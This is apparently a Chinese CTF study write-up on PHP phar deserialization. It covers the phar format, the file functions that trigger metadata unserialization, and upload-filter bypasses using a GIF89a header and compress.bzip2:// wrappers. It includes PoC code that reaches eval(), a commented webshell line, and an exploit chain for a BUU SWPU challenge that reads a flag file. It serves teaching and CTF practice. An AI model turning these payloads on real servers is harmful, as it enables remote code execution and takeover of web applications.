phar反序列化
=
我在这里介绍了phar文件的结构，利用原理，利用方法，从各路大佬的博客搜集了很多汇总在了一起，最后根据我自己做的一道ctf题来说明phar反序列化的利用方式，在后面我会补充blackhat大会中发现者对其的原文叙述。希望有大佬若感觉我说的有不完善的地方，请告诉我，谢谢。
#在此记录一个phar反序列化的题，是buu的swpu的题

利用条件：

-phar文件能够上传到服务器
 
-要有可用的魔术方法作为“跳板”
 
-文件操作函数的参数可控，且：/ \ 等特殊字符没有被过滤
 
有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化.

phar反序列化我暂时总结的是，当我们遇到过滤的东西太多，无从下手或者没有明显的反序列化点时可以尝试，他并不是真的没有反序列化，而是相关的底层代码将我们传入的恶意代码进行了反序列化，可以造成命令执行或者拿到权限等操作。

phar文件的结构
-
1.A stub

可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件

2.A manifest describing the contents

phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是phar反序列化攻击手法最核心的地方
序列化存储导致的问题，哈哈。
![cnblog](https://img2020.cnblogs.com/blog/1586953/202003/1586953-20200319122903685-1941180881.png)

3.The file contents

被压缩文件的内容。

4.[optional] a signature for verifying Phar integrity (phar file format only)

签名，放在文件末尾，格式如下：
![cnblog](https://img2020.cnblogs.com/blog/1586953/202003/1586953-20200319123125303-264069685.png)
这块签名这里也有一道题后面补上，是nss的一道prize题，我记得

注意：要将php.ini中的 phar.readonly 选项设置为Off，否则无法生成phar文件。
自己看看自己的那个apache解析的是不是你用的那个php.ini，我他喵的整了半天以为php版本不对导致phar源码出问题了，后来发现这块出的问题，别忘把前面的分号去了，然后生成一个phar文件
```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```
hex编码工具打开查看，可以看到 meta-data 序列化的内容成功的保存到了文件中
![](https://img2020.cnblogs.com/blog/1586953/202003/1586953-20200319124829131-660204420.png)

在一些 文件函数 通过 phar:// 伪协议解析phar文件时都会将meta-data反序列化

受影响的函数有:
```php
fileatime    filectime        filemtime    file_exists    file_get_contents    file_put_contents

file         filegroup        fopen        fileinode      fileowner            fileperms

is_dir       is_file          is_link      is_executable  is_readable          is_writeable

is_wirtble   parse_ini_file   copy         unlink         stat                 readfile        info_file 
```

在 zsx 师傅的文章又通过 php_stream_open_wrapper 方法的调用函数中，探索出一些新的可用函数！

exif

exif_thumbnailexif_imagetype
gd

imageloadfontimagecreatefrom***
hash

hash_hmac_filehash_filehash_update_filemd5_filesha1_file
file / url

get_meta_tagsget_headers
standard

getimagesizegetimagesizefromstring
zip

$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');
Bzip / Gzip

如果 phar://不能出现在头几个字符怎么办？

demo.php?filename=compress.bzip2://phar://upload_file/shell.gif/a
同样的也可以往里面写入一句话木马什么的，反正最后就是为了拿到权限。
验证
代码
```php

<?php
error_reporting(0);
$filename=$_GET['filename'];
if (preg_match("/\bphar\b/A", $filename)) {
    echo "stop hacking!\n";
}
else {
    class comrare
    {
        public $haha = 'haha';

        function __wakeup()
        {
            eval($this->haha);
        }

    }

    imagecreatefromjpeg($_GET['filename']);
}
?>
poc 验证

<?php
class comrare
{
    public $haha = 'comrarezzzzz';

}
@unlink('shell.phar');
$phar = new Phar("shell.phar"); //后缀名必须为 phar
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$object = new comrare();
//$object ->haha= 'eval(@$_POST[\'a\']);';
$object ->haha= 'phpinfo();';
$phar->setMetadata($object); //将自定义的 meta-data 存入 manifest
$phar->addFromString("a", "a"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

?>

```
这个 poc 同时绕过了 gif 限制和 phar 开头限制，同样我们可以 getshell 成功！

已经序列化的内容已经保存在了phar.phar中，我们用受影响的函数进行试验，去触发反序列化
```php
<?php 
    class TestObject {
        public function __destruct() {
            echo 'Destruct called';
        }
    }

    $filename = 'phar://phar.phar/test.txt'; //test.txt是保存在phar包中的文件条目
    file_exists($filename); //受影响的file_exists函数
?>
```
结果内容如下：

![](https://img2020.cnblogs.com/blog/1586953/202003/1586953-20200319131257281-727881069.png)

可以看到先触发了反序列化 输出了test内容，然后还会执行当前TestObject类中的析构函数，如果当前没有写TestObject类的话，单纯执行反序列化只会输出test内容！

当文件系统函数的参数可控时，我们可以在 不调用unserialize()的情况下 进行 反序列化操作 ，一些之前看起来"人畜无害"的函数也变得"暗藏杀机"，极大的拓展了攻击面 ！

PHP底层phar解析数据处理过程
-

```php
int phar_parse_metadata(char **buffer, zval *metadata, uint32_t zip_metadata_len){

    php_unserialize_data_t var_hash;
    if (zip_metadata_len) {
        const unsigned char *p;
        unsigned char *p_buff = (unsigned char *)estrndup(*buffer, zip_metadata_len);
        p = p_buff;
        ZVAL_NULL(metadata);
        PHP_VAR_UNSERIALIZE_INIT(var_hash);

        if (!php_var_unserialize(metadata, &p, p + zip_metadata_len, &var_hash)) { //这里是最重要的，如果metadata存在的话 就会帮我们进行反序列化的操作，if语句后面就是对前面生成的数据的内存清除
            efree(p_buff);
            PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
            zval_ptr_dtor(metadata);
            ZVAL_UNDEF(metadata);
            return FAILURE;
        }
        efree(p_buff);
        PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
    }
}
```

unserialize 的定义为：若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）

所以先前定义的 TestObject 类，当有数据被反序列化了之后就会被重新构造为TestObject类的对象，并且还会有属于自己的属性!

phar包的伪装
-

phar文件还可以伪装后缀名，首先要知道的phar文件唯一的标识符__HALT_COMPILER();?>，只要不影响标识符，那么我们就可以通过 添加任意的文件头 + 修改后缀名的方式 来将phar文件伪装成其他格式的文件

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

生成的文件为如下：
![](https://img2020.cnblogs.com/blog/1586953/202003/1586953-20200319132016702-702107505.png)

采用这种方法可以绕过很大一部分上传检测。

phar反序列化实际应用
-

拿一道ctf的题目来进行学习：

第一题：

```php
<?php 

if(isset($_GET['filename'])){
    $filename = $_GET['filename'];
    class MyClass{
        var $Output = 'echo "hahaha"';
        function __destruct()
        {
            // TODO: Implement __destruct() method.
            eval($this->Output);
        }
    }
    file_exists($filename);
}else{
    highlight_file(__FILE__);
}
```
我们可以通过上面生成phar包，其中meta-data 部分是 存储了MyClass实例化的对象值，然后通过$_GET['filename']，进行 file_exists 从而触发反序列化来覆盖 $Output 变量，最后导致eval($this->Output);命令执行！

![](https://img2020.cnblogs.com/blog/1586953/202003/1586953-20200323193327291-1509746713.png)


真题实战
-
进去题目之后主要就是一顿包含然后找到源码
最后能看到base.php中的/flag的提示
然后回到class.php中，在这里面进行反序列化，首先找到一个入口一个出口，先快速的找能利用的函数，可以控制参数的地方，很明显看到一个file_get_contents,那么如何利用这个函数呢？
找链子，想要调用这个函数就观察里面的参数，一级级往上找就行，最后能到__get这个魔术方法，想要调用这个方法的话，需要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法，想要调用这个方法又要将一个类当做字符串来调用，能看到最上面有一个destruct函数，只有把一个类附上去，然后echo出来就可以调用了，链子找完了之后就可以进行具体的exp构造了，这里利用phar反序列化，首先说下大致流程，先还是序列化，然后将恶意代码保存到phar文件中，最后再phar协议来解析他，文件包含，拿到权限。(得有文件包含利用点，还需要知道文件的路径才能操作)

```php
#class.php
class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
 
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
#exp：
?php
class C1e4r
{
    public $test;
    public $str;
}
 
class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
 
}
$a= new C1e4r();
$b= new Show();
$c= new Test();
$c->params['source'] = "/var/www/html/f1ag.php";
$a->str = $b;
$b->str['str'] = $c;
$phar = new Phar("exp.phar"); //生成phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata($a); //触发头是C1e4r类
$phar->addFromString("exp.txt", "test"); //生成签名
$phar->stopBuffering();
?>

